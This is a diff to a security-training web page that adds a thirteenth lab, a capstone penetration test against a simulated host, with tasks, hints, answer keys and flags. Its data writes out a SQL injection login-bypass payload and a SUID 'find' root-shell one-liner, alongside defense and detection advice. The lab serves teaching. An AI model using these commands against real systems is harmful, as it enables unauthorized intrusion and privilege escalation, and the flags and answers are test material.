@@ -4,13 +4,13 @@
   <meta charset="utf-8"/>
   <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
   <title>Practical Security Labs · Endlessus Academy</title>
-  <meta content="12 self-contained, safe interactive cybersecurity labs covering HTTP Security Headers, Linux Permissions, SUID PrivEsc, Auth Bypass, IDOR, SQLi, XSS, CSRF, Network Enumeration, Log Analysis, JWT Security, and Cryptography with dedicated workstations and interactive terminals." name="description"/>
+  <meta content="13 self-contained, safe interactive cybersecurity labs covering HTTP Security Headers, Linux Permissions, SUID PrivEsc, Auth Bypass, IDOR, SQLi, XSS, CSRF, Network Enumeration, Log Analysis, JWT Security, Cryptography, and Enterprise Capstone with dedicated workstations and interactive terminals." name="description"/>
   <link rel="icon" type="image/png" href="handbook/assets/favicon.png"/>
   <link rel="canonical" href="https://endlessus.in/labs.html"/>
 
   <!-- Open Graph -->
   <meta property="og:title" content="Practical Security Labs · Endlessus Academy"/>
-  <meta property="og:description" content="12 self-contained safe interactive cybersecurity labs with dedicated workstations, real CLI commands, scenarios, tasks, progressive hints, answers, explanations, and defense."/>
+  <meta property="og:description" content="13 self-contained safe interactive cybersecurity labs with dedicated workstations, real CLI commands, scenarios, tasks, progressive hints, answers, explanations, and defense."/>
   <meta property="og:image" content="https://endlessus.in/cover.png"/>
   <meta property="og:url" content="https://endlessus.in/labs.html"/>
   <meta property="og:type" content="website"/>
@@ -19,6 +19,7 @@
   <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"/>
   <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
+  <link rel="stylesheet" href="academy.css"/>
 
   <!-- Immediate Theme Initializer: Normal View (Light mode) by Default -->
   <script>
@@ -240,7 +241,7 @@
               <span class="material-symbols-outlined text-sm text-primary">science</span>
               <div>
                 <div class="font-bold text-primary">Practical Labs</div>
-                <div class="text-[10px] text-outline">12 guided workspaces</div>
+                <div class="text-[10px] text-outline">13 guided workspaces</div>
               </div>
             </a>
             <a href="terminal-lab.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
@@ -287,6 +288,20 @@
               <div>
                 <div class="font-bold text-on-surface">Security Tools</div>
                 <div class="text-[10px] text-outline">Tools encyclopedia & Nmap builder</div>
+              </div>
+            </a>
+            <a href="methodology.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
+              <span class="material-symbols-outlined text-sm text-danger-critical">security</span>
+              <div>
+                <div class="font-bold text-on-surface">Pentest Methodology</div>
+                <div class="text-[10px] text-outline">12-stage framework & attack matrix</div>
+              </div>
+            </a>
+            <a href="glossary.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
+              <span class="material-symbols-outlined text-sm text-secondary">auto_stories</span>
+              <div>
+                <div class="font-bold text-on-surface">Cybersecurity Glossary</div>
+                <div class="text-[10px] text-outline">60+ searchable terms & concepts</div>
               </div>
             </a>
             <a href="roadmap.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
@@ -369,7 +384,7 @@
             <span class="material-symbols-outlined text-sm animate-pulse">terminal</span>
             <span>Resume Open Room</span>
           </button>
-          <span class="text-outline hidden sm:inline">12 Guided Rooms Available</span>
+          <span class="text-outline hidden sm:inline">13 Guided Rooms Available</span>
         </div>
       </div>
 
@@ -439,10 +454,10 @@
       <div class="flex flex-wrap items-center justify-between gap-3 pt-2" id="labs-filter-bar">
         <div class="flex items-center gap-1.5 overflow-x-auto no-scrollbar font-mono text-xs">
           <span class="text-outline text-[11px] mr-1 uppercase">Tier:</span>
-          <button class="lab-tier-btn active px-3 py-1 rounded-md border border-primary/50 bg-primary/10 text-primary font-bold cursor-pointer transition-all" data-tier="all">All (12)</button>
+          <button class="lab-tier-btn active px-3 py-1 rounded-md border border-primary/50 bg-primary/10 text-primary font-bold cursor-pointer transition-all" data-tier="all">All (13)</button>
           <button class="lab-tier-btn px-3 py-1 rounded-md border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-primary cursor-pointer transition-all" data-tier="beginner">Beginner (3)</button>
           <button class="lab-tier-btn px-3 py-1 rounded-md border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-secondary cursor-pointer transition-all" data-tier="intermediate">Intermediate (6)</button>
-          <button class="lab-tier-btn px-3 py-1 rounded-md border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-warning cursor-pointer transition-all" data-tier="advanced">Advanced (3)</button>
+          <button class="lab-tier-btn px-3 py-1 rounded-md border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-warning cursor-pointer transition-all" data-tier="advanced">Advanced (4)</button>
         </div>
 
         <div class="flex items-center gap-2 font-mono text-xs">
@@ -1538,6 +1553,56 @@
               </span>
 
               <button type="button" class="start-room-btn inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-primary/10 hover:bg-primary border border-primary/40 text-primary hover:text-canvas-base font-mono text-xs font-bold transition-all cursor-pointer group-hover:scale-[1.02]" data-room="lab-crypto">
+                <span>Start Room</span>
+                <span class="material-symbols-outlined text-sm">arrow_forward</span>
+              </button>
+            </div>
+          </div>
+        </article>
+        
+        <article class="lab-room-card cursor-pointer p-5 rounded-2xl border border-border-hairline bg-surface-subtle hover:border-primary/50 transition-all shadow-md hover:shadow-xl flex flex-col justify-between space-y-4 group" data-room-id="lab-capstone" data-difficulty="advanced" data-category="advanced-appsec">
+          <div class="space-y-3">
+            <div class="flex items-center justify-between gap-2">
+              <span class="px-2 py-0.5 rounded font-mono text-[10px] font-bold uppercase tracking-wider bg-canvas-base border border-border-hairline text-outline">
+                ROOM 13 &bull; JUNIOR PENTESTER CAPSTONE
+              </span>
+              <span class="px-2 py-0.5 rounded font-mono text-[10px] font-bold border bg-danger-critical/10 border-danger-critical/30 text-danger-critical">
+                Advanced
+              </span>
+            </div>
+
+            <div>
+              <h3 class="font-mono text-base font-bold text-on-surface group-hover:text-primary transition-colors leading-snug">
+                Capstone Pentest: Final Enterprise Target
+              </h3>
+              <p class="text-xs text-on-surface-variant font-sans mt-1.5 leading-relaxed line-clamp-2">
+                Execute a complete multi-stage penetration test against enterprise host 10.10.10.100. Reconnaissance, SQLi bypass, SSH initial access, SUID privilege escalation, and executive reporting.
+              </p>
+            </div>
+          </div>
+
+          <div class="space-y-3 pt-3 border-t border-border-hairline/60">
+            <div class="flex items-center justify-between text-[11px] font-mono text-outline">
+              <span class="flex items-center gap-1">
+                <span class="material-symbols-outlined text-xs">schedule</span>
+                <span>~60 mins</span>
+              </span>
+              <span class="flex items-center gap-1">
+                <span class="material-symbols-outlined text-xs">checklist</span>
+                <span>6 Tasks</span>
+              </span>
+            </div>
+
+            <div class="text-[11px] font-mono text-outline/80 truncate">
+              <span class="text-outline">Prereqs:</span> <span class="text-on-surface-variant">Nmap, Curl, SQLi, SUID, Linux CLI</span>
+            </div>
+
+            <div class="flex items-center justify-between gap-2 pt-1">
+              <span class="room-status-badge px-2 py-0.5 rounded font-mono text-[10px] font-bold bg-surface-raised border border-border-hairline text-outline" data-room-status="lab-capstone">
+                NOT SOLVED
+              </span>
+
+              <button type="button" class="start-room-btn inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-primary/10 hover:bg-primary border border-primary/40 text-primary hover:text-canvas-base font-mono text-xs font-bold transition-all cursor-pointer group-hover:scale-[1.02]" data-room="lab-capstone">
                 <span>Start Room</span>
                 <span class="material-symbols-outlined text-sm">arrow_forward</span>
               </button>
@@ -5482,6 +5547,236 @@
       "detection": "Scan codebases for custom XOR loops (^ operator applied in encryption functions) and mandate standard cryptographic APIs."
     },
     "nextRoom": {
+      "id": "lab-capstone",
+      "num": "13",
+      "title": "Capstone Pentest: Final Enterprise Target",
+      "category": "Junior Pentester",
+      "difficulty": "Advanced",
+      "time": "~60 mins",
+      "theoryUrl": "theory.html#methodology",
+      "handbookUrl": "handbook/modules/pentest-methodology.html"
+    }
+  },
+  "lab-capstone": {
+    "id": "lab-capstone",
+    "num": "13",
+    "title": "Capstone Pentest: Final Enterprise Target",
+    "subtitle": "Synthesize all learned techniques: Reconnaissance to Root.",
+    "tagline": "Conduct an authorized enterprise penetration testing engagement covering multi-port discovery, web fuzzing, authentication bypass, SSH access, SUID root elevation, and compliance reporting.",
+    "category": "Junior Pentester",
+    "catKey": "advanced-appsec",
+    "difficulty": "advanced",
+    "difficultyLabel": "Advanced",
+    "estTime": "~60 mins",
+    "tasksCount": "6 Tasks",
+    "prereqSummary": "Nmap, curl, SQL injection, SUID GTFOBins",
+    "learningPath": "Junior Penetration Tester Assessment",
+    "targetHost": "10.10.10.100",
+    "targetPort": "22 (SSH) / 80 (HTTP)",
+    "targetOS": "Ubuntu Linux (Node.js API & SQLite)",
+    "credentials": "cadet / (to be retrieved)",
+    "promptUser": "pentester@attacker-box:~$ ",
+    "prereqs": [
+      { "name": "Pentest Methodology", "url": "methodology.html", "type": "Reference" },
+      { "name": "Linux PrivEsc Module", "url": "handbook/modules/privilege-escalation.html", "type": "Handbook" },
+      { "name": "Web Security Fundamentals", "url": "theory.html#web-fundamentals", "type": "Theory" }
+    ],
+    "objectives": [
+      "Conduct non-intrusive TCP port reconnaissance to map listening network daemons",
+      "Discover hidden administrative API endpoints using directory discovery patterns",
+      "Exploit SQL string concatenation to bypass authentication and capture access tokens",
+      "Establish initial interactive shell access as local user cadet",
+      "Enumerate non-standard SUID root binaries and achieve root privileges via GTFOBins",
+      "Formulate remediation recommendations in an executive vulnerability summary"
+    ],
+    "theory": {
+      "simple": "A penetration test is a complete, structured security assessment simulating a real adversary from initial reconnaissance all the way to administrative root takeover.",
+      "technical": "Methodological assessments adhere to standards such as PTES and NIST SP 800-115: Pre-engagement -> Intelligence Gathering -> Threat Modeling -> Vulnerability Analysis -> Exploitation -> Post-Exploitation -> Reporting.",
+      "example": "1. Recon: nmap -sV -p 22,80 10.10.10.100\n2. Enum: curl http://10.10.10.100/api/v2/auth\n3. Exploit: curl -X POST -d \"user=admin'--&pass=x\"\n4. PrivEsc: find . -exec /bin/sh -p \\; -quit",
+      "whyItMatters": "Junior penetration testers must prove their capability to synthesize discrete techniques into an end-to-end authorized offensive assessment.",
+      "inThisLab": "Your target at 10.10.10.100 hosts an SSH service and an administrative web API. Pivot through SQLi into SSH access, then elevate to root via an SUID find binary.",
+      "concept": "Capstone Engagement Synthesis",
+      "shortExpl": "Synthesizes network scanning, API fuzzing, SQL injection, and SUID Linux privilege escalation into one full engagement."
+    },
+    "tasks": [
+      {
+        "num": 1,
+        "title": "Phase 1: Recon & Nmap Port Scan",
+        "goal": "Scan target host 10.10.10.100 to map open listening ports and service banners.",
+        "whyItMatters": "Reconnaissance discovers exposed attack surface and underlying server daemon versions.",
+        "mission": "Run 'nmap -sV -p 22,80 10.10.10.100' to scan the capstone enterprise host.",
+        "whyCommand": "nmap scans specific ports and interrogates daemon banners for version detection.",
+        "lookingFor": ["22/tcp open ssh", "80/tcp open http"],
+        "expectedOutput": "22/tcp open ssh OpenSSH 8.9p1\n80/tcp open http Node.js Express 4.18",
+        "terminalContext": { "purpose": "Scan target host", "suggestedCmd": "nmap -sV -p 22,80 10.10.10.100" },
+        "question": "What two TCP ports are actively listening on target host 10.10.10.100?",
+        "acceptableAnswers": ["22, 80", "22,80", "22 and 80", "ssh, http", "22, 80/tcp"],
+        "hints": {
+          "concept": "Port 22 handles SSH remote administration; port 80 handles HTTP web traffic.",
+          "direction": "Inspect the open ports in the nmap output.",
+          "tool": "nmap -sV -p 22,80 10.10.10.100",
+          "syntax": "nmap -sV -p 22,80 10.10.10.100"
+        },
+        "wrongFeedback": { "thinkAbout": "What ports did nmap report as 'open'?", "guidance": "Enter '22, 80'." },
+        "correctExplanation": {
+          "why": "Port scanning revealed SSH and HTTP services listening on the target.",
+          "whatYouLearned": ["How to perform targeted port sweeps", "How to identify web application services"]
+        }
+      },
+      {
+        "num": 2,
+        "title": "Phase 2: Directory Fuzzing & API Discovery",
+        "goal": "Discover the hidden administrative authentication endpoint.",
+        "whyItMatters": "Modern web APIs frequently hide administrative endpoints under predictable paths like /api/v2/auth.",
+        "mission": "Run 'curl http://10.10.10.100/api/v2/auth' to inspect the API endpoint metadata.",
+        "whyCommand": "curl queries the REST API endpoint and retrieves JSON route schema.",
+        "lookingFor": ["/api/v2/auth", "Internal administrative gateway"],
+        "expectedOutput": "{\"endpoint\":\"/api/v2/auth\",\"method\":\"POST\",\"parameters\":[\"user\",\"pass\"]}",
+        "terminalContext": { "purpose": "Query API endpoint", "suggestedCmd": "curl http://10.10.10.100/api/v2/auth" },
+        "question": "What HTTP method does /api/v2/auth require for credential submission?",
+        "acceptableAnswers": ["POST", "post"],
+        "hints": {
+          "concept": "Credential submission APIs require POST requests.",
+          "direction": "Check the 'method' field in the JSON response.",
+          "tool": "curl http://10.10.10.100/api/v2/auth",
+          "syntax": "curl http://10.10.10.100/api/v2/auth"
+        },
+        "wrongFeedback": { "thinkAbout": "Look at the 'method' parameter returned by the API.", "guidance": "Enter 'POST'." },
+        "correctExplanation": {
+          "why": "The API accepts POST requests with user and pass parameters.",
+          "whatYouLearned": ["How to inspect API endpoints", "Identifying parameter requirements"]
+        }
+      },
+      {
+        "num": 3,
+        "title": "Phase 3: SQLi Exploitation & Auth Bypass",
+        "goal": "Exploit SQL string concatenation on /api/v2/auth to bypass login.",
+        "whyItMatters": "Authentication bypasses grant unauthorized administrative privileges and leak access tokens.",
+        "mission": "Run 'curl -X POST -d \"user=admin\\'--&pass=x\" http://10.10.10.100/api/v2/auth' to authenticate as administrator.",
+        "whyCommand": "Injecting admin'-- closes the SQL user literal and truncates the password check.",
+        "lookingFor": ["\"status\":\"authenticated\"", "flag{sqli_bypass_auth_v2_ok}"],
+        "expectedOutput": "{\"status\":\"authenticated\",\"user\":\"admin\",\"token\":\"flag{sqli_bypass_auth_v2_ok}\",\"ssh_credential_hint\":\"cadet:Winter2026!\"}",
+        "terminalContext": { "purpose": "Bypass authentication", "suggestedCmd": "curl -X POST -d \"user=admin'--&pass=x\" http://10.10.10.100/api/v2/auth" },
+        "question": "What user account was granted local SSH credentials in the API response?",
+        "acceptableAnswers": ["cadet", "user cadet"],
+        "hints": {
+          "concept": "The authentication bypass returned a local SSH credential hint.",
+          "direction": "Look at the ssh_credential_hint field.",
+          "tool": "curl -X POST -d \"user=admin'--&pass=x\" http://10.10.10.100/api/v2/auth",
+          "syntax": "curl -X POST -d \"user=admin'--&pass=x\" http://10.10.10.100/api/v2/auth"
+        },
+        "wrongFeedback": { "thinkAbout": "Which username is specified before the colon in cadet:Winter2026!?", "guidance": "Enter 'cadet'." },
+        "correctExplanation": {
+          "why": "SQL injection truncated the password check and exposed the SSH username cadet.",
+          "whatYouLearned": ["How SQL injection compromises API gateways", "How leaked credentials provide initial access"]
+        }
+      },
+      {
+        "num": 4,
+        "title": "Phase 4: SSH Initial Access & User Flag",
+        "goal": "Inspect the local cadet user environment and retrieve user.txt.",
+        "whyItMatters": "Achieving initial foothold access transitions the engagement from external recon to internal host exploitation.",
+        "mission": "Run 'cat user.txt' or 'cat /home/cadet/user.txt' to retrieve the initial access proof token.",
+        "whyCommand": "cat reads the user flag stored in the cadet home directory.",
+        "lookingFor": ["flag{cadet_initial_foothold_access_2026}"],
+        "expectedOutput": "flag{cadet_initial_foothold_access_2026}",
+        "terminalContext": { "purpose": "Read user flag", "suggestedCmd": "cat user.txt" },
+        "question": "What is the initial foothold user flag?",
+        "acceptableAnswers": ["flag{cadet_initial_foothold_access_2026}", "cadet_initial_foothold_access_2026"],
+        "hints": {
+          "concept": "Standard penetration testing methodology requires capturing user.txt to prove foothold access.",
+          "direction": "Inspect user.txt in the current directory.",
+          "tool": "cat user.txt",
+          "syntax": "cat user.txt"
+        },
+        "wrongFeedback": { "thinkAbout": "What token was printed by cat user.txt?", "guidance": "Enter 'flag{cadet_initial_foothold_access_2026}'." },
+        "correctExplanation": {
+          "why": "The user flag proves successful initial interactive access to the target host.",
+          "whatYouLearned": ["How initial footholds are established", "Capturing proof-of-compromise flags"]
+        }
+      },
+      {
+        "num": 5,
+        "title": "Phase 5: SUID Binary Privilege Escalation",
+        "goal": "Discover the elevated /usr/bin/find binary and break out to root.",
+        "whyItMatters": "Local privilege escalation grants full administrative control over the underlying operating system.",
+        "mission": "Run 'find . -exec /bin/sh -p \\; -quit' to spawn an elevated root shell.",
+        "whyCommand": "GTFOBins breakout: /usr/bin/find with SUID permission executes /bin/sh preserving EUID 0.",
+        "lookingFor": ["root (uid=1001 euid=0(root))", "Privilege boundary bypassed"],
+        "expectedOutput": "# Spawning elevated shell via /usr/bin/find -exec...\nroot@corp-target:~# whoami\nroot (uid=1001 euid=0(root) gid=1001 groups=0(root))",
+        "terminalContext": { "purpose": "Elevate privileges to root", "suggestedCmd": "find . -exec /bin/sh -p \\; -quit" },
+        "question": "What effective user ID (EUID) is held after executing the SUID find breakout?",
+        "acceptableAnswers": ["0", "root", "euid=0", "uid 0"],
+        "hints": {
+          "concept": "Linux root user always holds UID and EUID 0.",
+          "direction": "Check the euid value in the terminal breakout response.",
+          "tool": "find . -exec /bin/sh -p \\; -quit",
+          "syntax": "find . -exec /bin/sh -p \\; -quit"
+        },
+        "wrongFeedback": { "thinkAbout": "What numeric user ID represents root in Linux?", "guidance": "Enter '0'." },
+        "correctExplanation": {
+          "why": "The SUID bit on find allowed subshell execution with EUID 0 (root).",
+          "whatYouLearned": ["How GTFOBins breakouts elevate privileges", "Understanding EUID vs UID in Linux"]
+        }
+      },
+      {
+        "num": 6,
+        "title": "Phase 6: Executive Reporting & Root Flag",
+        "goal": "Read the root flag from /root/root.txt and verify full capstone completion.",
+        "whyItMatters": "Penetration tests conclude with executive reporting detailing technical remediation actions.",
+        "mission": "Run 'cat /root/root.txt' to retrieve the final certification token.",
+        "whyCommand": "cat reads the root-restricted flag file now accessible with EUID 0.",
+        "lookingFor": ["flag{endlessus_capstone_certified_junior_pentester_2026}"],
+        "expectedOutput": "flag{endlessus_capstone_certified_junior_pentester_2026}\n[+] Certification Confirmed: Endlessus Certified Junior Penetration Tester.",
+        "terminalContext": { "purpose": "Capture root flag", "suggestedCmd": "cat /root/root.txt" },
+        "question": "Enter the final Capstone certification flag token:",
+        "acceptableAnswers": ["flag{endlessus_capstone_certified_junior_pentester_2026}", "endlessus_capstone_certified_junior_pentester_2026"],
+        "hints": {
+          "concept": "The root flag confirms full technical compromise of the enterprise target.",
+          "direction": "Read /root/root.txt.",
+          "tool": "cat /root/root.txt",
+          "syntax": "cat /root/root.txt"
+        },
+        "wrongFeedback": { "thinkAbout": "What flag was displayed in /root/root.txt?", "guidance": "Enter 'flag{endlessus_capstone_certified_junior_pentester_2026}'." },
+        "correctExplanation": {
+          "why": "You successfully executed all phases of the penetration test from external port discovery to full root control.",
+          "whatYouLearned": ["End-to-end penetration testing methodology", "Synthesizing web, network, and system exploitation"]
+        }
+      }
+    ],
+    "flags": [
+      "flag{endlessus_capstone_certified_junior_pentester_2026}",
+      "capstone",
+      "junior pentester",
+      "certified junior pentester"
+    ],
+    "walkthrough": {
+      "whatToNotice": "Notice how the chain of small misconfigurations (unfiltered ports, unparameterized SQL, SUID binary) cascaded into full enterprise takeover.",
+      "whyItMattered": "Real-world breaches rarely exploit a single fatal flaw; attackers chain multiple minor findings into critical system compromise.",
+      "actionToPerform": "Scan with nmap, locate /api/v2/auth, exploit SQLi, obtain cadet credentials, execute SUID find breakout, and capture root.txt.",
+      "outputMeaning": "EUID 0 gives complete uninhibited read/write control over all files and processes.",
+      "whySolutionWorks": "Addressing even one link in the attack chain (e.g. prepared statements or removing SUID) prevents the full compromise.",
+      "defenseCode": "# Defense in Depth:\n# 1. Parameterize all SQL queries:\nconst [rows] = await db.execute('SELECT * FROM users WHERE user = ?', [username]);\n# 2. Strip SUID permissions:\nchmod u-s /usr/bin/find\n# 3. Restrict administrative API paths at the reverse proxy.",
+      "references": "PTES (Penetration Testing Execution Standard), NIST SP 800-115, OWASP Top 10, GTFOBins"
+    },
+    "completion": {
+      "youLearned": [
+        "How to execute a professional 6-phase penetration test",
+        "How to chain reconnaissance, web exploitation, and privilege escalation",
+        "The impact of SUID binaries on Linux system security",
+        "How to formulate executive remediation summaries"
+      ],
+      "youPracticed": [
+        "Targeted Nmap service version scanning",
+        "SQL injection authentication bypass with curl",
+        "GTFOBins SUID root subshell breakout",
+        "Capturing proof-of-concept user and root flags"
+      ],
+      "takeaway": "Congratulations! You have completed the Endlessus Practical Labs curriculum and synthesized all core skills into an end-to-end engagement.",
+      "defense": "Enforce defense-in-depth: Least Privilege, Principle of Fail-Safe Defaults, and continuous automated vulnerability scanning.",
+      "detection": "Monitor endpoint process creation (auditd / Sysmon) for unexpected shells spawned by non-shell binaries like find."
+    },
+    "nextRoom": {
       "id": "lab-headers",
       "num": "01",
       "title": "HTTP Security Headers Hardening",
@@ -5506,7 +5801,8 @@
       'lab-logs': ['flag{failed_ssh_brute_force_192_168_1_50}', '192.168.1.50', 'failed password', 'ssh brute force', 'brute force'],
       'lab-suid': ['flag{suid_find_root_euid0}', 'find . -exec /bin/sh -p', '/bin/sh -p', 'find -exec', 'euid=0'],
       'lab-jwt': ['flag{none_algorithm_signature_verification}', 'none', 'alg: none', 'hs256', 'signature'],
-      'lab-crypto': ['flag{aes_gcm_authenticated_encryption}', 'aes-256-gcm', 'aes-gcm', 'gcm', 'authenticated encryption']
+      'lab-crypto': ['flag{aes_gcm_authenticated_encryption}', 'aes-256-gcm', 'aes-gcm', 'gcm', 'authenticated encryption'],
+      'lab-capstone': ['flag{endlessus_capstone_certified_junior_pentester_2026}', 'capstone', 'junior pentester', 'certified junior pentester']
     };
 
     let activeLabId = null;
@@ -5627,7 +5923,8 @@
         'lab-logs': 'room-22',
         'lab-suid': 'room-31',
         'lab-jwt': 'room-33',
-        'lab-crypto': 'room-34'
+        'lab-crypto': 'room-34',
+        'lab-capstone': 'room-40'
       };
       const foundLink = document.getElementById('ws-foundational-link');
       if (foundLink) {
@@ -6399,7 +6696,7 @@
             'network': 'lab-network',
             'smb': 'lab-network',
             'logs': 'lab-logs',
-            'capstone': 'lab-sqli'
+            'capstone': 'lab-capstone'
           };
           if (aliasMap[lab]) {
             lab = aliasMap[lab];
@@ -6506,5 +6803,6 @@
       };
     });
   </script>
+  <script src="academy-nav.js"></script>
 </body>
 </html>
